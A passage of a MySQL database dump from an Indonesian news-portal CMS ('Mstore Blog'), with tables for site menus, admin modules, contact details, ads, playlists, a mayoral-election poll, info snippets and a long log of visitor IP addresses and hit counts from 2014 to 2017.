(178, 0, 'Susunan Redaksi', '#', 'Ya', 'Top', 4),
(116, 0, 'Hubungi Kami', 'hubungi', 'Ya', 'Top', 3),
(119, 0, 'Index Berita', 'berita/indeks_berita', 'Ya', 'Bottom', 18),
(179, 0, 'Pemberitaan Media Siber', '#', 'Ya', 'Top', 5),
(148, 149, 'Hukum', 'kategori/detail/hukum', 'Ya', 'Bottom', 11),
(149, 0, 'Berita', '#', 'Ya', 'Bottom', 7),
(185, 0, 'Forum', 'konsultasi', 'Ya', 'Bottom', 23),
(186, 0, 'Login', 'login', 'Ya', 'Bottom', 25),
(187, 0, 'Agenda', 'agenda', 'Ya', 'Bottom', 22),
(181, 0, 'Download', 'download', 'Ya', 'Bottom', 19),
(182, 0, 'Video', 'playlist', 'Ya', 'Bottom', 20),
(183, 0, 'Gallery', 'albums', 'Ya', 'Bottom', 21),
(184, 0, 'Register', 'kontributor', 'Ya', 'Bottom', 24),
(168, 149, 'Sport', '#', 'Ya', 'Bottom', 13),
(169, 149, 'Hiburan', '#', 'Ya', 'Bottom', 12),
(170, 0, 'Religi', '#', 'Ya', 'Bottom', 14),
(171, 170, 'Tokoh', '#', 'Ya', 'Bottom', 15),
(172, 170, 'Ceramah', '#', 'Ya', 'Bottom', 16),
(173, 170, 'Hikmah', '#', 'Ya', 'Bottom', 17),
(188, 0, 'Tentang Kami', '/halaman/detail/tentang-kami-mstore-blog', 'Ya', 'Top', 1),
(189, 0, 'Tentang Kami', '/halaman/detail/tentang-kami-mstore-blog', 'Ya', 'Top', 6);

-- --------------------------------------------------------

--
-- Struktur dari tabel `modul`
--

CREATE TABLE `modul` (
  `id_modul` int(5) NOT NULL,
  `nama_modul` varchar(50) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `link` varchar(100) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `static_content` text CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `gambar` varchar(100) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `publish` enum('Y','N') CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL DEFAULT 'Y',
  `status` enum('user','admin') CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `aktif` enum('Y','N') CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL DEFAULT 'Y',
  `urutan` int(5) NOT NULL,
  `link_seo` varchar(50) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `modul`
--

INSERT INTO `modul` (`id_modul`, `nama_modul`, `username`, `link`, `static_content`, `gambar`, `publish`, `status`, `aktif`, `urutan`, `link_seo`) VALUES
(2, 'Manajemen User', 'admin', 'manajemenuser', '', '', 'Y', 'user', 'Y', 0, ''),
(18, 'Berita', 'admin', 'listberita', '', '', 'Y', 'user', 'Y', 0, ''),
(71, 'Background Website', 'admin', 'background', '', '', 'N', 'admin', 'N', 0, ''),
(10, 'Manajemen Modul', 'admin', 'manajemenmodul', '', '', 'Y', 'user', 'Y', 0, ''),
(31, 'Kategori Berita ', 'admin', 'kategorikategori', '', '', 'Y', 'user', 'Y', 0, ''),
(33, 'Jajak Pendapat', 'admin', 'jajakpendapat', '', '', 'Y', 'user', 'Y', 0, ''),
(34, 'Tag Berita', 'admin', 'tagberita', '', '', 'Y', 'user', 'Y', 0, ''),
(35, 'Komentar Berita', 'admin', 'komentarberita', '', '', 'Y', 'user', 'Y', 0, ''),
(41, 'Agenda', 'admin', 'agenda', '', '', 'Y', 'user', 'Y', 0, ''),
(43, 'Berita Foto', 'admin', 'album', '', '', 'Y', 'user', 'Y', 0, ''),
(44, 'Galeri Berita Foto', 'admin', 'gallery', '', '', 'Y', 'user', 'Y', 0, ''),
(45, 'Template Website', 'admin', 'templatewebsite', '', '', 'Y', 'user', 'Y', 0, ''),
(46, 'Sensor Kata', 'admin', 'sensorkomentar', '', '', 'Y', 'user', 'Y', 0, ''),
(61, 'Identitas Website', 'admin', 'identitaswebsite', '', '', 'Y', 'user', 'Y', 0, ''),
(57, 'Menu Website', 'admin', 'menuwebsite', '', '', 'Y', 'user', 'Y', 0, ''),
(59, 'Halaman Baru', 'admin', 'halamanbaru', '', '', 'Y', 'user', 'Y', 0, ''),
(62, 'Video', 'admin', 'video', '', '', 'Y', 'user', 'Y', 0, ''),
(63, 'Playlist Video', 'admin', 'playlist', '', '', 'Y', 'user', 'Y', 0, ''),
(64, 'Tag Video', 'admin', 'tagvideo', '', '', 'Y', 'user', 'Y', 0, ''),
(65, 'Komentar Video', 'admin', 'komentarvideo', '', '', 'Y', 'user', 'Y', 0, ''),
(66, 'Logo Website', 'admin', 'logowebsite', '', '', 'Y', 'user', 'Y', 0, ''),
(67, 'Iklan Sidebar', 'admin', 'iklansidebar', '', '', 'N', 'admin', 'N', 0, ''),
(68, 'Iklan Home', 'admin', 'iklanhome', '', '', 'N', 'admin', 'N', 0, ''),
(69, 'Iklan Atas', 'admin', 'iklanatas', '', '', 'N', 'admin', 'N', 0, ''),
(70, 'Pesan Masuk', 'admin', 'pesanmasuk', '', '', 'Y', 'user', 'Y', 0, ''),
(72, 'Sekilas Info', 'admin', 'sekilasinfo', '', '', 'N', 'admin', 'N', 0, ''),
(73, 'Yahoo Messanger', 'admin', 'ym', '', '', 'N', 'admin', 'N', 0, ''),
(74, 'Download Area', 'admin', 'download', '', '', 'Y', 'admin', 'Y', 0, ''),
(75, 'Alamat Kontak', 'admin', 'alamat', '', '', 'Y', 'admin', 'Y', 0, '');

-- --------------------------------------------------------

--
-- Struktur dari tabel `mod_alamat`
--

CREATE TABLE `mod_alamat` (
  `id_alamat` int(5) NOT NULL,
  `alamat` text CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `mod_alamat`
--

INSERT INTO `mod_alamat` (`id_alamat`, `alamat`) VALUES
(1, '<p><strong>Haloo!</strong>, Kami berkomitmen memberikan layanan terbaik untuk Anda,&nbsp;menyediakan produk dan layanan terbaik yang Anda butuhkan. Apabila untuk alasan tertentu Anda merasa tidak puas dengan pelayanan kami dapat menyampaikan kritik dan saran.<br>\r\n<br><strong>MULTI GROUP</strong><br>\r\nMstore Blog | Portal Media Online dan Terupdate<br>Ratu Plaza, Kav. 9 No. 9 Lantai 3\r\nJl. Jend. Sudirman, RT.1/RW.3, Duren Tiga Jakarta \r\nDKI Jakarta, Daerah Khusus Ibukota Jakarta 10270</p><p>\r\nTelp. 0877 8212 9053<br>\r\nEmail: redaksi@mstore.co.id</p>\r\n');

-- --------------------------------------------------------

--
-- Struktur dari tabel `mod_ym`
--

CREATE TABLE `mod_ym` (
  `id` int(11) NOT NULL,
  `nama` varchar(255) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `ym_icon` int(3) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `pasangiklan`
--

CREATE TABLE `pasangiklan` (
  `id_pasangiklan` int(5) NOT NULL,
  `judul` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `url` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `source` text COLLATE latin1_general_ci NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_posting` date NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `pasangiklan`
--

INSERT INTO `pasangiklan` (`id_pasangiklan`, `judul`, `username`, `url`, `source`, `gambar`, `tgl_posting`) VALUES
(1, 'Kiri - Iklan Sidebar', 'admin', 'https://mstore.co.id/', '', 'banner2.jpg', '2020-07-06'),
(2, 'Kanan - Iklan Sidebar', 'admin', 'https://mstore.co.id/', '', 'banner1.jpg', '2020-07-06');

-- --------------------------------------------------------

--
-- Struktur dari tabel `playlist`
--

CREATE TABLE `playlist` (
  `id_playlist` int(5) NOT NULL,
  `jdl_playlist` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `playlist_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `gbr_playlist` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y'
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `playlist`
--

INSERT INTO `playlist` (`id_playlist`, `jdl_playlist`, `username`, `playlist_seo`, `gbr_playlist`, `aktif`) VALUES
(56, 'Playlist Video 1', 'admin', 'playlist-video-1', '', 'Y'),
(57, 'Playlist Video 2', 'admin', 'playlist-video-2', '', 'Y'),
(61, 'Playlist Video 4', 'admin', 'playlist-video-4', '', 'Y'),
(60, 'Playlist Video 3', 'admin', 'playlist-video-3', '', 'Y');

-- --------------------------------------------------------

--
-- Struktur dari tabel `poling`
--

CREATE TABLE `poling` (
  `id_poling` int(5) NOT NULL,
  `pilihan` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `status` varchar(20) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `rating` int(5) NOT NULL DEFAULT 0,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `poling`
--

INSERT INTO `poling` (`id_poling`, `pilihan`, `status`, `username`, `rating`, `aktif`) VALUES
(18, 'Siapakah Calon Walikota dan Wakil Walikota Padang Favorit Anda?', 'Pertanyaan', 'admin', 0, 'Y'),
(25, 'Mahyeldi Ansyarullah - Emzalmi', 'Jawaban', 'admin', 25, 'Y'),
(31, 'Robby Prihandaya - Dewi Safitri', 'Jawaban', 'admin', 1, 'Y'),
(32, 'Tommy Utama - Laura Hikmah', 'Jawaban', 'admin', 3, 'Y'),
(33, 'Willy Fernando - Vicky Armita', 'Jawaban', 'admin', 9, 'Y'),
(35, 'Laura Himah i Nisaa - Safaruddin', 'Jawaban', 'admin', 5, 'Y');

-- --------------------------------------------------------

--
-- Struktur dari tabel `sekilasinfo`
--

CREATE TABLE `sekilasinfo` (
  `id_sekilas` int(5) NOT NULL,
  `info` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_posting` date NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y'
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `sekilasinfo`
--

INSERT INTO `sekilasinfo` (`id_sekilas`, `info`, `tgl_posting`, `gambar`, `aktif`) VALUES
(1, 'Anak yang mengalami gangguan tidur, cenderung memakai obat2an dan alkohol berlebih saat dewasa.', '2015-04-11', '', 'Y'),
(2, 'WHO merilis, 30 persen anak di dunia kecanduan komputer dan menonton televisi.', '2015-03-16', '', 'Y'),
(3, 'Menurut peneliti di Detroit, orang yang selalu tersenyum lebar cenderung hidup lama.', '2015-04-17', '', 'Y'),
(4, 'Menurut United Stated Representatives, 25% obat beredar di adalah palsu.', '2015-04-17', '', 'Y');

-- --------------------------------------------------------

--
-- Struktur dari tabel `statistik`
--

CREATE TABLE `statistik` (
  `ip` varchar(20) NOT NULL DEFAULT '',
  `tanggal` date NOT NULL,
  `hits` int(10) NOT NULL DEFAULT 1,
  `online` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `statistik`
--

INSERT INTO `statistik` (`ip`, `tanggal`, `hits`, `online`) VALUES
('223.255.231.148', '2014-05-06', 1, '1399357334'),
('223.255.231.147', '2014-05-15', 3, '1400119147'),
('223.255.224.73', '2014-05-15', 12, '1400123797'),
('223.255.224.69', '2014-05-16', 2, '1400215103'),
('118.96.51.231', '2014-05-16', 19, '1400233044'),
('223.255.231.146', '2014-05-16', 2, '1400228049'),
('::1', '2014-06-20', 2, '1403230579'),
('::1', '2014-06-22', 8, '1403436591'),
('223.255.231.154', '2014-06-26', 1, '1403739948'),
('223.255.231.148', '2014-06-26', 6, '1403745715'),
('223.255.224.74', '2014-06-26', 1, '1403748060'),
('223.255.224.69', '2014-06-26', 1, '1403753239'),
('223.255.224.77', '2014-06-29', 1, '1404039342'),
('::1', '2014-07-02', 6, '1404277263'),
('127.0.0.1', '2014-07-17', 2, '1405582494'),
('127.0.0.1', '2014-07-21', 1, '1405929828'),
('36.76.60.43', '2014-07-21', 1, '1405951864'),
('223.255.231.154', '2014-07-21', 2, '1405957200'),
('223.255.227.21', '2014-07-22', 1, '1405995171'),
('223.255.231.146', '2014-07-22', 1, '1405997152'),
('223.255.227.21', '2014-07-23', 1, '1406100212'),
('223.255.227.17', '2014-07-23', 1, '1406104552'),
('223.255.227.23', '2014-07-24', 1, '1406168095'),
('223.255.231.153', '2014-07-24', 1, '1406204439'),
('223.255.231.146', '2014-07-25', 1, '1406268985'),
('180.76.5.193', '2014-08-06', 1, '1407302738'),
('180.76.5.23', '2014-08-06', 1, '1407304739'),
('202.67.36.241', '2014-08-06', 1, '1407305643'),
('198.148.27.22', '2014-08-06', 1, '1407306703'),
('180.251.170.42', '2014-08-06', 7, '1407310167'),
('128.199.171.191', '2014-08-06', 3, '1407323435'),
('223.255.231.149', '2014-08-06', 2, '1407309879'),
('223.255.227.28', '2014-08-06', 8, '1407311801'),
('103.24.49.242', '2014-08-06', 1, '1407312326'),
('223.255.231.146', '2014-08-06', 1, '1407313297'),
('180.214.233.34', '2014-08-06', 1, '1407321063'),
('66.249.77.87', '2014-08-06', 1, '1407323509'),
('223.255.227.30', '2014-08-06', 1, '1407325862'),
('180.254.207.13', '2014-08-06', 5, '1407330687'),
('114.79.13.199', '2014-08-06', 1, '1407336900'),
('202.152.199.34', '2014-08-06', 7, '1407337100'),
('180.76.6.21', '2014-08-07', 1, '1407347753'),
('114.79.13.55', '2014-08-07', 3, '1407354277'),
('114.125.41.136', '2014-08-07', 1, '1407352625'),
('180.76.6.147', '2014-08-07', 1, '1407355344'),
('180.76.6.64', '2014-08-07', 1, '1407367237'),
('69.171.247.116', '2014-08-07', 1, '1407379834'),
('69.171.247.119', '2014-08-07', 1, '1407379834'),
('69.171.247.114', '2014-08-07', 1, '1407379834'),
('69.171.247.115', '2014-08-07', 1, '1407379834'),
('202.67.34.29', '2014-08-07', 2, '1407380415'),
('36.76.52.112', '2014-08-07', 1, '1407380496'),
('223.255.231.145', '2014-08-07', 5, '1407387045'),
('223.255.231.153', '2014-08-07', 2, '1407388883'),
('223.255.227.27', '2014-08-07', 1, '1407393087'),
('180.76.5.25', '2014-08-07', 1, '1407394749'),
('223.255.231.146', '2014-08-07', 1, '1407397183'),
('157.55.39.248', '2014-08-07', 1, '1407397231'),
('180.254.200.55', '2014-08-07', 2, '1407399466'),
('110.139.67.15', '2014-08-07', 8, '1407399221'),
('180.242.17.64', '2014-08-07', 11, '1407414373'),
('141.0.8.59', '2014-08-07', 1, '1407412384'),
('110.76.149.91', '2014-08-07', 1, '1407422367'),
('223.255.231.151', '2014-08-07', 3, '1407426943'),
('82.145.209.206', '2014-08-07', 1, '1407430369'),
('223.255.227.28', '2014-08-08', 3, '1407469589'),
('66.93.156.50', '2014-08-08', 1, '1407472340'),
('202.62.17.47', '2014-08-08', 1, '1407484393'),
('36.70.135.163', '2014-08-08', 6, '1407485987'),
('173.252.74.115', '2014-08-08', 1, '1407485153'),
('118.96.58.136', '2014-08-08', 2, '1407486347'),
('114.79.29.68', '2014-08-08', 1, '1407502537'),
('66.220.156.113', '2014-08-08', 1, '1407503375'),
('112.215.66.79', '2014-08-08', 1, '1407503381'),
('125.163.113.156', '2014-08-08', 9, '1407508824'),
('180.76.5.94', '2014-08-08', 1, '1407508624'),
('120.172.9.192', '2014-08-08', 1, '1407515634'),
('202.67.41.51', '2014-08-08', 1, '1407515702'),
('180.253.243.222', '2014-08-09', 1, '1407542724'),
('36.75.224.20', '2014-08-09', 1, '1407548005'),
('180.76.5.65', '2014-08-09', 1, '1407548865'),
('66.249.77.77', '2014-08-09', 2, '1407582711'),
('180.76.6.137', '2014-08-09', 1, '1407553037'),
('66.249.77.87', '2014-08-09', 1, '1407554836'),
('66.249.77.97', '2014-08-09', 2, '1407562640'),
('120.177.44.126', '2014-08-09', 2, '1407558625'),
('223.255.231.145', '2014-08-09', 3, '1407558663'),
('36.73.64.113', '2014-08-09', 1, '1407558640'),
('36.72.187.12', '2014-08-09', 1, '1407560351'),
('202.67.41.51', '2014-08-09', 1, '1407561096'),
('114.125.60.68', '2014-08-09', 4, '1407561514'),
('202.67.40.50', '2014-08-09', 1, '1407562007'),
('180.76.6.136', '2014-08-09', 1, '1407562581'),
('110.232.81.2', '2014-08-09', 5, '1407563275'),
('146.185.28.59', '2014-08-09', 1, '1407564768'),
('120.174.157.139', '2014-08-09', 1, '1407568139'),
('223.255.227.23', '2014-08-09', 2, '1407570163'),
('193.105.210.119', '2014-08-09', 1, '1407577518'),
('125.162.57.66', '2014-08-09', 2, '1407579822'),
('180.241.163.1', '2014-08-09', 8, '1407580493'),
('36.76.44.163', '2014-08-09', 6, '1407603574'),
('180.76.5.144', '2014-08-09', 1, '1407582757'),
('107.167.103.40', '2014-08-09', 1, '1407586189'),
('36.68.48.23', '2014-08-09', 1, '1407586974'),
('192.99.218.151', '2014-08-09', 4, '1407587574'),
('36.74.55.24', '2014-08-09', 3, '1407589161'),
('118.97.212.184', '2014-08-09', 8, '1407595169'),
('36.72.114.118', '2014-08-09', 2, '1407597684'),
('180.76.5.153', '2014-08-09', 1, '1407602870'),
('180.76.5.59', '2014-08-09', 1, '1407603153'),
('180.76.5.18', '2014-08-10', 1, '1407606581'),
('180.254.155.156', '2014-08-10', 2, '1407607003'),
('180.76.6.42', '2014-08-10', 1, '1407608363'),
('36.68.242.217', '2014-08-10', 5, '1407627100'),
('66.249.77.77', '2014-08-10', 2, '1407633623'),
('202.67.44.64', '2014-08-10', 1, '1407629598'),
('180.76.6.43', '2014-08-10', 1, '1407631270'),
('118.97.212.182', '2014-08-10', 4, '1407632228'),
('139.0.102.140', '2014-08-10', 1, '1407633944'),
('66.249.77.87', '2014-08-10', 1, '1407636902'),
('66.249.77.97', '2014-08-10', 1, '1407639983'),
('180.76.6.159', '2014-08-10', 1, '1407640798'),
('118.97.212.181', '2014-08-10', 3, '1407642556'),
('36.68.46.37', '2014-08-10', 2, '1407642940'),
('180.76.5.69', '2014-08-10', 1, '1407645158'),
('180.76.5.80', '2014-08-10', 1, '1407648268'),
('180.76.5.143', '2014-08-10', 1, '1407650068'),
('223.255.231.145', '2014-08-10', 1, '1407650216'),
('180.76.6.149', '2014-08-10', 1, '1407657020'),
('36.77.183.218', '2014-08-10', 2, '1407657119'),
('127.0.0.1', '2014-08-10', 2, '1407660057'),
('127.0.0.1', '2014-08-11', 2, '1407725194'),
('127.0.0.1', '2014-08-12', 1, '1407862185'),
('127.0.0.1', '2014-08-13', 1, '1407899819'),
('127.0.0.1', '2014-08-17', 44, '1408287630'),
('127.0.0.1', '2014-08-18', 253, '1408372590'),
('127.0.0.1', '2014-08-19', 4, '1408413702'),
('::1', '2014-08-19', 90, '1408433250'),
('::1', '2014-08-31', 1, '1409487043'),
('::1', '2015-03-11', 11, '1426061663'),
('::1', '2015-03-12', 1, '1426114982'),
('::1', '2015-03-15', 32, '1426430637'),
('::1', '2015-03-18', 137, '1426666506'),
('::1', '2015-03-19', 143, '1426751746'),
('::1', '2015-03-21', 198, '1426912294'),
('::1', '2015-03-22', 554, '1427039069'),
('127.0.0.1', '2015-03-22', 1, '1427030317'),
('::1', '2015-03-23', 275, '1427093113'),
('::1', '2015-03-24', 42, '1427179474'),
('::1', '2015-03-25', 45, '1427251499'),
('39.225.164.2', '2015-05-14', 7, '1431584409'),
('119.110.72.130', '2015-05-14', 30, '1431595368'),
('89.145.95.2', '2015-05-14', 1, '1431582645'),
('66.220.158.118', '2015-05-14', 1, '1431582842'),
('66.220.158.115', '2015-05-14', 1, '1431582852'),
('66.220.158.112', '2015-05-14', 3, '1431595371'),
('66.220.158.119', '2015-05-14', 1, '1431582942'),
('114.125.43.185', '2015-05-14', 5, '1431602132'),
('119.110.72.130', '2015-05-15', 1, '1431673658'),
('114.125.45.206', '2015-05-16', 18, '1431741581'),
('66.220.158.116', '2015-05-16', 1, '1431741049'),
('66.220.158.118', '2015-05-16', 1, '1431741224'),
('66.220.158.114', '2015-05-16', 1, '1431741233'),
('39.229.6.148', '2015-05-16', 11, '1431791037'),
('39.225.236.155', '2015-05-17', 8, '1431862096'),
('119.110.72.130', '2015-05-19', 6, '1432006569'),
('89.145.95.42', '2015-05-19', 2, '1432006661'),
('114.121.133.117', '2015-05-19', 3, '1432046663'),
('124.195.114.65', '2015-05-28', 16, '1432832381'),
('66.220.158.119', '2015-05-28', 1, '1432831000'),
('66.220.158.115', '2015-05-28', 1, '1432831013'),
('66.220.158.116', '2015-05-28', 1, '1432832385'),
('124.195.114.65', '2015-05-29', 77, '1432836214'),
('66.220.158.113', '2015-05-29', 1, '1432835961'),
('66.249.84.178', '2015-05-29', 1, '1432836220'),
('103.246.200.14', '2015-05-29', 1, '1432851867'),
('103.246.200.59', '2015-05-29', 1, '1432851916'),
('114.124.5.250', '2015-05-29', 6, '1432852876'),
('173.252.105.114', '2015-05-29', 1, '1432852770'),
('120.180.175.150', '2015-05-29', 36, '1432864082'),
('103.246.200.50', '2015-05-29', 1, '1432863615'),
('103.246.200.1', '2015-05-29', 1, '1432863650'),
('103.246.200.33', '2015-05-29', 1, '1432863711'),
('103.246.200.44', '2015-05-29', 1, '1432863795'),
('120.174.144.115', '2015-05-29', 1, '1432908445'),
('119.110.72.130', '2015-05-29', 27, '1432912022'),
('173.252.90.117', '2015-05-29', 1, '1432910852'),
('173.252.90.116', '2015-05-29', 1, '1432910873'),
('173.252.90.118', '2015-05-29', 1, '1432911344'),
('173.252.90.122', '2015-05-29', 1, '1432911470'),
('66.249.84.190', '2015-05-30', 1, '1432945579'),
('39.254.117.222', '2015-05-30', 1, '1432991226'),
('66.249.84.178', '2015-05-31', 1, '1433037242'),
('120.176.92.190', '2015-06-01', 3, '1433128955'),
('66.102.6.210', '2015-06-01', 1, '1433134430'),
('120.164.44.28', '2015-06-01', 13, '1433149419'),
('124.195.118.227', '2015-06-01', 1, '1433170960'),
('120.177.28.244', '2015-06-02', 8, '1433220043'),
('66.249.84.190', '2015-06-02', 1, '1433247837'),
('120.190.75.179', '2015-06-03', 7, '1433302768'),
('119.110.72.130', '2015-06-03', 4, '1433302761'),
('89.145.95.2', '2015-06-03', 1, '1433302690'),
('66.249.71.147', '2015-06-07', 46, '1433696370'),
('66.249.71.130', '2015-06-07', 30, '1433696150'),
('66.249.71.164', '2015-06-07', 37, '1433696154'),
('173.252.74.113', '2015-06-07', 8, '1433694061'),
('173.252.74.117', '2015-06-07', 3, '1433676319'),
('66.249.64.57', '2015-06-07', 1, '1433674283'),
('173.252.88.89', '2015-06-07', 5, '1433677999'),
('173.252.88.86', '2015-06-07', 2, '1433677597'),
('173.252.74.119', '2015-06-07', 7, '1433694862'),
('66.249.79.117', '2015-06-07', 1, '1433674983'),
('173.252.88.84', '2015-06-07', 2, '1433676738'),
('173.252.74.115', '2015-06-07', 3, '1433676460'),
('173.252.74.114', '2015-06-07', 2, '1433694204'),
('173.252.74.118', '2015-06-07', 3, '1433676180'),
('173.252.74.112', '2015-06-07', 5, '1433695314'),
('173.252.88.85', '2015-06-07', 2, '1433677804'),
('173.252.88.90', '2015-06-07', 1, '1433676251'),
('173.252.74.116', '2015-06-07', 5, '1433695249'),
('173.252.88.87', '2015-06-07', 2, '1433677488'),
('173.252.88.88', '2015-06-07', 1, '1433677370'),
('66.249.79.130', '2015-06-07', 1, '1433694848'),
('66.220.156.116', '2015-06-07', 2, '1433696197'),
('66.249.67.104', '2015-06-07', 1, '1433696147'),
('66.220.156.112', '2015-06-07', 2, '1433696173'),
('66.220.146.22', '2015-06-07', 1, '1433696162'),
('66.249.67.117', '2015-06-07', 1, '1433696288'),
('66.220.156.114', '2015-06-07', 1, '1433696309'),
('66.220.156.117', '2015-06-08', 3, '1433711204'),
('66.249.71.164', '2015-06-08', 32, '1433779112'),
('66.220.146.25', '2015-06-08', 2, '1433736854'),
('66.220.156.116', '2015-06-08', 2, '1433709422'),
('66.249.71.147', '2015-06-08', 29, '1433748751'),
('66.220.156.112', '2015-06-08', 4, '1433715007'),
('66.220.146.20', '2015-06-08', 1, '1433696744'),
('66.249.71.130', '2015-06-08', 38, '1433777391'),
('66.220.156.118', '2015-06-08', 2, '1433712628'),
('66.220.146.27', '2015-06-08', 1, '1433712556'),
('66.220.146.26', '2015-06-08', 1, '1433712746'),
('66.249.67.104', '2015-06-08', 4, '1433746797'),
('66.220.146.22', '2015-06-08', 1, '1433714244'),
('66.220.156.115', '2015-06-08', 2, '1433714821'),
('66.249.67.117', '2015-06-08', 2, '1433780504'),
('120.176.251.49', '2015-06-08', 2, '1433737104'),
('66.220.156.119', '2015-06-08', 1, '1433737457'),
('66.249.71.147', '2015-06-09', 3, '1433836081'),
('66.249.71.130', '2015-06-09', 4, '1433835126'),
('66.249.67.104', '2015-06-09', 1, '1433788622'),
('66.249.71.164', '2015-06-09', 1, '1433823064'),
('66.249.71.130', '2015-06-10', 5, '1433953790'),
('66.249.67.117', '2015-06-10', 1, '1433911605'),
('66.249.71.164', '2015-06-10', 3, '1433954890'),
('66.249.71.147', '2015-06-10', 2, '1433953573'),
('66.249.71.147', '2015-06-11', 1, '1433957808'),
('66.249.71.164', '2015-06-11', 2, '1433990805'),
('68.180.228.104', '2015-06-11', 1, '1433975257'),
('66.249.71.130', '2015-06-11', 1, '1433991891'),
('36.68.28.19', '2015-06-14', 5, '1434224041'),
('120.164.46.127', '2015-06-14', 2, '1434239557'),
('66.249.67.248', '2015-06-15', 1, '1434362861'),
('104.193.10.50', '2015-06-15', 3, '1434372762'),
('104.193.10.50', '2015-06-16', 2, '1434454308'),
('36.80.234.114', '2015-06-16', 4, '1434443273'),
('173.252.74.115', '2015-06-16', 1, '1434443264'),
('173.252.74.114', '2015-06-16', 1, '1434443279'),
('119.110.72.130', '2015-06-16', 1, '1434467216'),
('124.195.116.71', '2015-06-17', 3, '1434551738'),
('120.184.130.21', '2015-06-27', 1, '1435386862'),
('66.249.84.246', '2015-06-27', 1, '1435387150'),
('120.176.176.106', '2015-06-28', 7, '1435461088'),
('66.220.158.114', '2015-06-28', 1, '1435461007'),
('66.249.84.129', '2015-06-28', 1, '1435466083'),
('66.249.84.246', '2015-06-29', 2, '1435563211'),
('66.249.84.252', '2015-06-29', 1, '1435563206'),
('66.249.84.246', '2015-06-30', 3, '1435677685'),
('66.249.84.252', '2015-06-30', 1, '1435645799'),
('66.249.84.252', '2015-07-01', 1, '1435710707'),
('66.249.84.129', '2015-07-01', 1, '1435711780'),
('120.177.18.200', '2015-07-02', 1, '1435824891'),
('::1', '2015-11-25', 15, '1448407930'),
('::1', '2015-12-01', 12, '1448944568'),
('::1', '2015-12-03', 9, '1449138520'),
('::1', '2015-12-05', 26, '1449279360'),
('::1', '2015-12-07', 4, '1449442678'),
('::1', '2015-12-08', 8, '1449532582'),
('::1', '2015-12-13', 31, '1449974628'),
('::1', '2015-12-18', 9, '1450418535'),
('::1', '2015-12-21', 10, '1450654644'),
('::1', '2015-12-24', 3, '1450917714'),
('::1', '2015-12-25', 4, '1451037761'),
('::1', '2015-12-26', 5, '1451086546'),
('::1', '2016-01-01', 1, '1451626224'),
('::1', '2016-01-12', 2, '1452564572'),
('::1', '2016-01-16', 7, '1452913899'),
('::1', '2016-01-17', 150, '1453036730'),
('::1', '2016-07-24', 24, '1469318037'),
('::1', '2016-07-29', 1, '1469767572'),
('::1', '2016-07-31', 1, '1469936872'),
('::1', '2016-08-01', 14, '1470019073'),
('::1', '2016-08-12', 4, '1470940786'),
('::1', '2016-08-14', 3, '1471191885'),
('::1', '2016-08-22', 5, '1471851644'),
('::1', '2016-08-26', 4, '1472207940'),
('::1', '2016-08-29', 9, '1472475500'),
('::1', '2016-08-30', 1, '1472531831'),
('::1', '2016-09-13', 4, '1473760584'),
('::1', '2016-09-16', 7, '1473998550'),
('::1', '2016-09-17', 3, '1474076080'),
('::1', '2016-09-20', 4, '1474335445'),
('::1', '2016-09-21', 5, '1474470987'),
('::1', '2016-09-26', 8, '1474866854'),
('::1', '2016-11-21', 20, '1479719811'),
('::1', '2016-11-22', 26, '1479795839'),
('::1', '2016-12-24', 1, '1482592503'),
('::1', '2016-12-23', 2, '1482451494'),
('::1', '2016-12-20', 7, '1482205377'),
('::1', '2016-12-14', 4, '1481717872'),
('::1', '2016-12-13', 24, '1481593512'),
('::1', '2016-12-09', 1, '1481243159'),
('::1', '2016-12-03', 3, '1480741491'),
('::1', '2016-11-28', 32, '1480303392'),
('::1', '2016-11-27', 2, '1480224412'),
('::1', '2016-11-24', 403, '1479984680'),
('::1', '2016-11-23', 2, '1479913316'),
('::1', '2017-01-03', 9, '1483421812'),
('::1', '2017-01-04', 2, '1483534977'),
('::1', '2017-01-05', 3, '1483627230'),
('::1', '2017-01-14', 1, '1484352852'),
('::1', '2017-01-17', 3, '1484663823'),
